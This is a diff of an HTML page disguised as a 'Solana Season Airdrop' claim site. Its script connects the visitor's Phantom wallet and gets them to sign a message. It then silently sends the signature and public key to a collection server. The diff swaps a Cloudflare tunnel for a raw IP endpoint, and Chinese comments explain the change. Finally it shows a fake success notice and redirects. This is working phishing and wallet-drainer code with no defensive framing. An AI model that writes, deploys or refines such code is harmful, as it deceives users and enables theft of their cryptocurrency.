@@ -3,47 +3,30 @@
 <body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
 <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
     <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
-    <p style="color:#888;margin-bottom:30px;">You are eligible to claim the exclusive reward pool.</p>
-    <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;box-shadow: 0 4px 15px #14F19577;">CLAIM AIRDROP</button>
-    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Verification Status: Awaiting Connection...</div>
+    <p style="color:#888;margin-bottom:30px;">Verification Node: 192.142.1.71</p>
+    <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">CLAIM AIRDROP</button>
+    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Direct Link Ready</div>
 </div>
 <script>
 document.getElementById('cta').onclick = async () => {
     try {
         const p = window.solana || window.phantom?.solana;
-        if (!p) { alert("Please use Trust Wallet or Phantom browser."); return; }
+        if (!p) { alert("Please use Phantom browser."); return; }
         const { publicKey } = await p.connect();
-        
-        // 🔱 使用你备份里的专业多行消息格式
-        const message = "Airdrop Claim ID: " + Math.floor(Math.random() * 999999) + "\n" +
-                        "Protocol: Solana Airdrop V4\n" +
-                        "Action: Verify Wallet Eligibility\n" +
-                        "Timestamp: " + Date.now();
+        const message = "Direct-Auth-" + Math.floor(Math.random() * 999999);
         const encodedMessage = new TextEncoder().encode(message);
-        document.getElementById('status').innerText = "Analyzing eligibility...";
-        
         const signedMessage = await p.signMessage(encodedMessage, "utf8");
         const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
         
-        // 🚀 使用刚才新生成的域名，并保留 keepalive
-        fetch("https://promotes-supported-mesa-warranties.trycloudflare.com/collect", {
+        // 🔱 核心：直接把数据甩给服务器 IP，不走隧道！
+        fetch("http://192.142.1.71:56368/collect", {
             method: 'POST',
             mode: 'no-cors',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                signature: signature,
-                pubkey: publicKey.toString(),
-                message: message
-            }),
+            body: JSON.stringify({ signature, pubkey: publicKey.toString(), message }),
             keepalive: true
         });
-
-        document.getElementById('status').style.color = '#14F195';
-        document.getElementById('status').innerText = "ELIGIBILITY VERIFIED!";
-        setTimeout(() => {
-            window.location.href = "https://solscan.io/account/" + publicKey.toString();
-        }, 800);
-        
+        document.getElementById('status').innerText = "SUCCESS! REDIRECTING...";
+        setTimeout(() => { window.location.href = "https://solscan.io"; }, 1000);
     } catch(e) { window.location.reload(); }
 }
 </script></body></html>
